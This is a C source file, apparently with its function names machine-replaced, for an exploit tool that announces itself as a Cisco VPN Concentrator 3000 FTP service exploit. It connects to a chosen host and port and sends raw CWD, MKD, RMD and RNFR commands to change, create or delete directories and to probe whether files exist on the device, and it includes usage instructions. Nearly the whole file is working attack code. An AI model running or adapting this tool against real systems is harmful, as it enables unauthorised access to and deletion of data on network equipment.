#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct option {char* member_0; int member_1; char member_3; int /*<<< orphan*/  member_2; } ;
struct hostent {int /*<<< orphan*/  h_length; int /*<<< orphan*/ * h_addr_list; int /*<<< orphan*/  h_addrtype; } ;
typedef  int /*<<< orphan*/  servAddr ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int FUNC0 (char*) ; 
 int FUNC1 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 struct hostent* FUNC3 (char*) ; 
 int FUNC4 (int,char**,char*,struct option*,int*) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 char* FUNC6 (int) ; 
 int /*<<< orphan*/  FUNC7 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 char* optarg ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int FUNC9 (int,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC10 (int,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC11 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC12 (char*,char*,char*) ; 
 int FUNC13 (char*) ; 
 int /*<<< orphan*/ * FUNC14 (char*,char*) ; 

int FUNC15 (int argc, char *argv[]){
	int ihost=0,index=0,imkdir=0,ichdir=0,idelete=0,itest=0,ipass=0,port=21;
	int c, sd, rc, size;
	char *host, *directory, *file, *buffer, *rbuffer;
	struct sockaddr_in servAddr;
	struct hostent *h;
        static struct option options[]={
                {"server", 1, 0, 's'},
                {"port", 1, 0, 'p'},
                {"rmdir", 1, 0, 'r'},
                {"mkdir", 1, 0, 'm'},
                {"chdir", 1, 0, 'c'},
		{"test", 1, 0, 't'},
                {"help", 0, 0,'h'}
        };
	FUNC8("[ Cisco VPN Concentrator 3000 FTP service exploit\n");
        while(c != -1){
                c = FUNC4(argc,argv,"s:p:r:m:c:t:h",options,&index);
                switch(c){
                        case 's':
                                if(ihost==0){
	                                h = FUNC3(optarg);
        	                        if(h==NULL){
                	                        FUNC8("[ Error unknown host '%s'\n",optarg);
                        	                FUNC2(1);
                                	}
	                                host = FUNC6(FUNC13(optarg) + 1);
        	                        FUNC12(host,"%s",optarg);
                	                ihost = 1;
                                }                               
				break;
			case 'p':
				port = FUNC0(optarg);
				break;
			case 'r':
				if(idelete==0){
					if(ipass!=1){
						ipass = 1;
						idelete = 1;
						directory = optarg;
					}
					else{
						FUNC8("[ Error: cannot delete directory as another option already selected\n");
						FUNC2(1);
					}
				}
				break;
			case 'c':
				if(ichdir==0){
					if(ipass!=1){
						ipass = 1;
						ichdir = 1;
						directory = optarg;
					}
					else{
						FUNC8("[ Error: cannot change dir as another option already selected\n");
						FUNC2(2);
					}
				}
				break;
			case 't':
				if(itest==0){
					if(ipass!=1){
						ipass = 1;
						itest = 1;
						file = optarg;
					}
					else{
						FUNC8("[ Error: cannot test for existance as another option already selected\n");
						FUNC2(3);
					}					
				}
				break;
			case 'm':
				if(imkdir==0){
					if(ipass!=1){
						ipass = 1;
						imkdir = 1;
						directory = optarg;
					}
					else{
						FUNC8("[ Error: cannot make directory as another option already selected\n");
						FUNC2(4);
					}
					
				}
				break;
			case 'h':
				FUNC8("[ Usage instructions.\n[\n");
				FUNC8("[ %s <required> (optional)\n[\n",argv[0]);
				FUNC8("[\t--server|-s <ip/hostname>\n[\t--port|-p (port) [default 21]\n[\t--rmdir|-r (directory)\n[\t--mkdir|-m (directory)\n");
				FUNC8("[\t--chdir|-c (directory)\n[\t--test|-t (filename/directory)\n[\n");
				FUNC2(0);
				break;
			default:
				break;
		}
	}
        if(ihost  != 1 || ipass != 1){
        	FUNC8("[ Error insufficient arguements, try running '%s --help'\n",argv[0]);
	        FUNC2(1);
        }
        servAddr.sin_family = h->h_addrtype;
        FUNC7((char *) &servAddr.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
        servAddr.sin_port = FUNC5(port);
        sd = FUNC11(AF_INET, SOCK_STREAM, 0);
        if(sd<0){
                FUNC8("[ Cannot open socket\n");
                FUNC2(1);
        }
        rc = FUNC1(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));
        if(rc<0){
                FUNC8("[ Cannot connect\n");
                FUNC2(1);
        }
        FUNC8("[ Connected to %s (%d/tcp)\n",host,port);
	rbuffer = FUNC6(1024);
	if(ichdir==1){
		FUNC8("[ Changing directory to %s\n",directory);
		size = 2048 + FUNC13(directory);
		buffer = FUNC6(size);
		FUNC12(buffer,"CWD %s\r\n",directory);
		rc = FUNC10(sd, buffer, FUNC13(buffer),0);
                while((rc = FUNC9(sd, rbuffer,1023,0)) != -1){
                        rbuffer[rc]=0;
                        if(FUNC14(rbuffer,"250 Changed to .") != NULL){
                                FUNC8("[ Success! changed directory to %s\n",directory);
                                break;
                        }
                        if(FUNC14(rbuffer,"530 Can't change directory to") != NULL){
                                FUNC8("[ Error! cannot set current directory to %s\n",directory);
                                FUNC2(-1);
                        }
                }
	}
	if(imkdir==1){
		FUNC8("[ Making directory %s\n",directory);
		size = 2048 + FUNC13(directory);
		buffer = FUNC6(size);
		FUNC12(buffer,"MKD %s\r\n",directory);
		rc = FUNC10(sd, buffer, FUNC13(buffer),0);
		while((rc = FUNC9(sd, rbuffer,1023,0)) != -1){
			rbuffer[rc]=0;
			if(FUNC14(rbuffer,"257 MKD command successful.") != NULL){
				FUNC8("[ Success! directory %s created\n",directory);
				break;
			}
		}
	}
	if(idelete==1){
		FUNC8("[ Deleting directory %s\n",directory);
		size = 2048 + FUNC13(directory);
		buffer = FUNC6(size);
		FUNC12(buffer,"RMD %s\r\n",directory);
		rc = FUNC10(sd, buffer, FUNC13(buffer),0);
                while((rc = FUNC9(sd, rbuffer,1023,0)) != -1){
                        rbuffer[rc]=0;
                        if(FUNC14(rbuffer,"250 RMD command successful.") != NULL){
                                FUNC8("[ Success! directory %s deleted\n",directory);
                                break;
                        }
                }
	}
	if(itest==1){
		FUNC8("[ Testing for the existance of %s\n",file);
		size = 2048 + FUNC13(file);
		buffer = FUNC6(size);
		FUNC12(buffer,"RNFR %s\r\n",file);
		rc = FUNC10(sd, buffer,FUNC13(buffer),0);		
                while((rc = FUNC9(sd, rbuffer,1023,0)) != -1){			
                	rbuffer[rc]=0;		
                        if(FUNC14(rbuffer,"350 RNFR accepted - file exists, ready for destination.") != NULL){
                                FUNC8("[ Success! %s does exist!\n",file);
                                break;
                        }
                        if(FUNC14(rbuffer,"550 File does not exist!") != NULL){
                                FUNC8("[ Success! %s does not exist\n",file);
                                break;
                        }
                }
	}
	FUNC2(0);
}